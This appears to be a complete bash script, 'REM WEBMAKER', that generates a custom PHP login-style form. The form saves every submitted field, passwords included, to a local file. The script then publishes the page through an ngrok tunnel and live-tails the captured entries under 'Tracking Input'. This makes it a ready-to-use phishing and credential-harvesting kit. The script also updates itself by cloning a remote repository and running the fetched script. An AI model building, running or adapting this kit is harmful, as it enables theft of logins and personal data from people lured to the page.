update(){
      clear
      read -n1 -p $'\e[1;91mPress 0 to update or \e[1;92mpress any key to continue: \e[0m' any
      if [ "$any" -eq "0" ]; then
         if [ $(echo $PWD | grep "remwebmaker" | wc -l) -gt 0 ]; then
           cd ../
           rm -rf remwebmaker
         fi
         echo -e "\n\e[95m------ Updating ------\e[0m\n"
         git clone https://github.com/NganarembaShija/remwebmaker
         mv remwebmaker/webmaker.sh ./webmaker.sh
         rm -rf remwebmaker
         read -n1 -p $'\n\n\n\e[1;92mUpdated Successfully\n\nPress any key to run the script again\e[0m' any
         bash webmaker.sh
      fi
}
update
clear
echo -e "##################\n   REM WEBMAKER\n##################\n"
linux=0
android=1
 ############################### Functions #####################
packageCheck(){
   if [ $1 ]; then
      dpkg -s $1 &>/dev/null
      if [ $? -ne 0 ]; then
         status=0
      else
         status=1
      fi
   fi
   if [ $2 ]; then
      dpkg -s $2 &>/dev/null
      if [ $? -ne 0 ]; then
         status2=0
      else
         status2=1
      fi
   fi
}

linuxInstall(){
   yes | sudo apt install $1
}

androidInstall(){
   yes | pkg install $1
}
################### INSTALLING CURL ################
 if [ "$(echo $OSTYPE)" == "linux-android" ]; then 
    echo -e "\e[1;91m SYSTEM: \e[1;92m Android\e[0m"
    device=$android
    packageCheck curl
    if [ $status -eq 0 ]; then
        echo -e "\nInstalling curl...\n"
         androidInstall curl
    fi
elif [ "$(echo $OSTYPE)" == "linux-gnu" ]; then
    echo -e "\e[1;91m SYSTEM: \e[1;92m Linux\e[0m"
    device=$linux
    packageCheck curl
    if [ $status -eq 0 ]; then
        echo -e "\nInstalling curl...\n"
        linuxInstall curl
    fi
else
     echo "Device Unknown"
     exit;
fi

################## ADDING BIN TO PATH #####################

echo -e "\nSetting BIN\n"
if [ -e "$HOME/bin" ]; then
      echo "BIN Present"
else
      mkdir -p "$HOME/bin"
      echo -e "\e[1;92mBin Created\e[0m";
fi
if [ ! -e "$HOME/.profile" ]; then
      touch $HOME/.profile
fi
cat $HOME/.profile | grep -w '$HOME/bin' &>/dev/null
if [ $? -ne 0 ]; then
	cat <<- 'EOF' >> $HOME/.profile
	if [ -e "$HOME/bin" ]; then
		PATH=$PATH:$HOME/bin
	fi
	EOF
fi
PATH=$PATH:$HOME/bin
################### DOWNLOADING NGROK #################
if [ -e "$HOME/bin/ngrok" ] || [ -e "./ngrok-stable-linux-arm64.tgz" ] || [ -e "./ngrok-stable-linux-amd64.zip" ]; then
    echo ""
else
    if [ $device -eq $linux ]; then
       echo -e "\nDownloading ngrok for linux. Please wait...\n"
       curl -# -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
    else
        echo -e "\nDownloading ngrok for android. Please wait...\n"
        curl -# -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz
    fi
fi
packageCheck tar zip
if [ $status -eq 0 ] || [ $status2 -eq 0 ]; then
    if [ $device -eq $android ]; then
     echo -e "\nInstalling tar or unzip...\n"
     androidInstall tar
     androidInstall zip
    elif [ $device -eq $linux ]; then
        echo -e "\nInstalling tar or unzip...\n"
        linuxInstall tar
        linuxInstall zip
    fi
fi

if [ $device -eq $linux ]; then
    if [ -e "$HOME/bin/ngrok" ]; then
        echo "ngrok present"
    else
        echo -e "\nExtracting ngrok...\n"
        unzip ngrok-stable-linux-amd64.zip
        chmod +x ngrok
        mv ngrok $HOME/bin/ngrok
    fi
else
    if [ -e "$HOME/bin/ngrok" ]; then
        echo "ngrok present"
    else
        echo -e "\nExtracting ngrok...\n"
        tar -xzf  ngrok-stable-linux-arm64.tgz
        chmod +x ngrok
        mv ngrok $HOME/bin/ngrok
    fi
fi
if [ -e "$HOME/.ngrok2/ngrok.yml" ]; then
    echo -e "ngrok yml config --> \e[1;92mOK\e[0m"
else
    read -p $'Enter your ngrok token here:\n' token
    ngrok authtoken $token
fi
################### CREATING WEBPAGE #############################
read -p $'Enter Webpage Folder name without space: ' folderName
mkdir -p "$folderName"
read -p $'Enter Webpage title: ' title
read -p $'Enter Header Name: ' h1Name
read -p $'Enter Header Background Color (small letter): ' h1color
read -p $'Enter Header Text Color (small letter): ' h1textcolor
read -p $'Enter Field 1 Name: ' field1name
read -p $'Enter Field 1 input type (eg. text, password, email, textarea) in small letter: ' field1input
read -p $'Enter Field 2 Name: ' field2name
read -p $'Enter Field 2 input type (eg. text, password, email, textarea) in small letter: ' field2input
read -p $'Enter Submit button name: ' submitbutton

cat <<- EOF >> $folderName/index.php
<?php
    session_start();
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=0.9">

        <title>$title</title>
        <script type="text/javascript">
            function check()
            {
                if(document.getElementById('$field1name').value=="")
                {
                    alert("Please enter $field1name");
                    document.getElementById('$field1name').focus();
                    return false;
                }
                if(document.getElementById('$field2name').value=="")
                {
                    alert("Please enter $field2name");
                    document.getElementById('$field2name').focus();
                    return false;
                }
                var txt;
                var r = confirm("Are you sure you want to submit?");
                if ( r != true ) {
                    return false;
                    }
            }
        </script>
        <style>
            input[type=text],input[type=password],input[type=email],input[type=textarea], select {
                width: 100%;
                padding: 12px 20px;
                margin: 8px 0;
                display: inline-block;
                border: 1px solid #ccc;
                border-radius: 4px;
                box-sizing: border-box;
                }
            body{
                margin: 0;
                border-radius: 5px;
                background-color: #f2f2f2;
            }
            h1{
                padding: 10px;
                margin: 0;
                background-color: $h1color;
                color: $h1textcolor;
            }
            table{
                padding-top: 50px;
            }
            .button {
                display: inline-block;
                border-radius: 4px;
                background-color: #008CBA;
                border: none;
                color: #FFFFFF;
                text-align: center;
                font-size: 17px;
                padding: 7px;
                width: 100px;
                transition: all 0.5s;
                cursor: pointer;
                margin: 5px;
                box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
            }

            .button span {
            cursor: pointer;
            display: inline-block;
            position: relative;
            transition: 0.5s;
            }

            .button span:after {
            content: '\00bb';
            position: absolute;
            opacity: 0;
            top: 0;
            right: -20px;
            transition: 0.5s;
            }

            .button:hover span {
            padding-right: 25px;
            }

            .button:hover span:after {
            opacity: 1;
            right: 0;
            }
        </style>
    </head>
    <body>
    <center>
        <h1>$h1Name</h1>
        <form method="post" action="post.php" onlick="return check()">
            <table border=0>
                <tr>
                    <td> <?php 
                            if(isset(REMCODE)){
                                echo REMCODE;
                            }
                        ?>
                    </td>
                </tr>
                <tr>
                    <td><input type="$field1input" id="$field1name" name="$field1name" placeholder="$field1name" required></td>
                </tr>
                <tr>
                    <td><input type="$field2input" id="$field2name" name="$field2name" placeholder="$field2name" required></td>
                </tr>
            </table><br><br>
            <button class="button" type="submit" style="vertical-align:middle"><span>$submitbutton</span></button>
        </form>
    </center>
    </body>
</html>
EOF
sed -i 's/REMCODE/$_SESSION["msg"]/g' $folderName/index.php
cat <<- 'EOF' >> $folderName/x.php
<?php 
    session_start();
    session_unset();
    session_destroy();
    header("Location: index.php");
?>
EOF

################### CREATING PHP CODE ######################

cat <<- 'EOF' >> $folderName/post.php
<?php
    session_start();
    $_SESSION["msg"] = "Submitted Successfully";
    $handle = fopen("file.txt","a+");
    foreach($_POST as $key => $value){
        fwrite($handle, $key);
        fwrite($handle, " = ");
        fwrite($handle, $value);
        fwrite($handle, "\r\n");
    }
    fclose($handle);
    header("Location: index.php");

    exit;
?>

EOF

############### INSTALLING PHP ########################
packageCheck php
if [ $status -eq 0 ]; then
    if [ $device -eq $linux ]; then
    echo -e "\nInstalling php...\n"
        linuxInstall php
    elif [ $device -eq $android ]; then
    echo -e "\nInstalling php...\n"
        androidInstall php
    fi
fi

echo -e "\n\e[1;92mWebpage Created Successfully\e[0m"

########################## CREATING LINK ##########################

cd "$folderName"
loc=$PWD
cat <<- 'EOF' >> run.sh
echo -e "\n\n\e[1;91mCreating Link Please wait...\e[0m"
php -S localhost:8080 > /dev/null 2>&1 &
sleep 3

read -n1 -p $'\n\n\e[92mPlease turn on your hotspot and press any key: \e[0m' any
countDown(){
	text="Please wait"
	i=10
	while [ $i -ge 0 ]
	do
		if [ $i -ne 10 ]; then
			echo -ne "\r$text $i sec "
		else
			echo -ne "\r\e[1;91m$text $i sec"
		fi
		sleep 1
		i=$((i-1))
	done
	echo -ne "\r-------------------------\e[0m\n"

}
echo ""
killall ngrok > /dev/null 2>&1
ngrok http 8080 > /dev/null 2>&1 &
countDown

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

if [ $link ]; then
    echo -e "\nYour Webpage Link\n---> \e[1;93m$link\e[0m"
else
    echo -e "\e[1;91mERROR! link cannot be created. Please force stop your terminal and try again.\e[0m"
fi
EOF
cd "$loc"
chmod 7777 run.sh
bash run.sh
echo -e "\n\n\n####################\n   Tracking Input\n####################\n"
touch file.txt
tail -f file.txt | grep -e "$field1name" -e "$field2name"
